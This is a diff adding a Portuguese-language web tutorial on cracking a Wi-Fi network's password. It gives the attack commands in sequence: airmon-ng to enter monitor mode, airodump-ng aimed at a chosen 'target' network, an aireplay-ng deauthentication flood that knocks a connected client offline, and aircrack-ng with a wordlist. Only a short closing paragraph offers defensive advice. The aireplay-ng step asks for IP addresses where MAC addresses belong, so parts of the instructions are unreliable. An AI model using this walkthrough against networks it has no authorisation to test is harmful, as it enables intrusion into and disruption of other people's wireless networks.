@@ -160,10 +160,97 @@
 
 
 
-                    <h1></h1>
+                    <h1>Iniciando o monitoramento</h1>
 
 
                 </div>
+
+                <code class="code">airmon-ng start wlan0</code>
+
+                <div class="titulokali">
+                    <h1>Listando Clientes.</h1>
+
+
+                </div>
+    
+
+
+                <div class="tor6">
+
+
+
+                    <h1>Pegue os dados do seu alvo e insira-os nas opções entre chaves (apague as chaves depois), abaixo:</h1>
+
+
+                </div>
+
+                <code class="code">airodump-ng mon0 --bssid {MAC_ADDRESS} --channel {CHANNEL} --write wifi.test</code>
+
+
+
+                <div class="tor6">
+
+
+
+                    <h1>Depois disso, o scanner lhe mostrará uma lista com todas as Wokstations (clientes) que estão conectados na rede.</h1>
+
+                </div>
+
+                <div class="titulokali">
+                    <h1>CAPTURANDO DADOS.</h1>
+
+                </div>
+
+                <div class="tor6">
+
+                    <h1>Abra um novo terminal, escolha uma workstation ativa e capture os pacotes dela (ela irá cair durante esse processo):</h1>
+
+                </div>
+
+
+                <code class="code">aireplay-ng -0 100 -a {GATEWAY IP} -c {WORKSTATION IP} mon0 --ignore-negative-one</code>
+
+
+
+                <div class="titulokali">
+                    <h1>CAPTURANDO SENHA.</h1>
+
+
+                </div>
+
+
+                <div class="tor6">
+
+                    <h1>Através dos dados capturados, tente descobrir a senha:</h1>
+
+                </div>
+
+                <code class="code">aircrack-ng wifi.test-01.cap -w wordlist.txt</code>
+
+                <div class="titulokali">
+                    <h1>COMO IMPEDIR ESSE TIPO DE INVASÃO?</h1>
+
+                </div>
+
+                <div class="tor6">
+
+                    <h1>Sempre utilize senhas complexas combinando caracteres especiais, como !@#$%¨&*()_+§, e se possível configure como oculto o SSID da rede (embora o Aircrack-ng detectá-la) para que ela não seja vista como um possível alvo de crackers.</h1>
+
+                </div>
+                
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
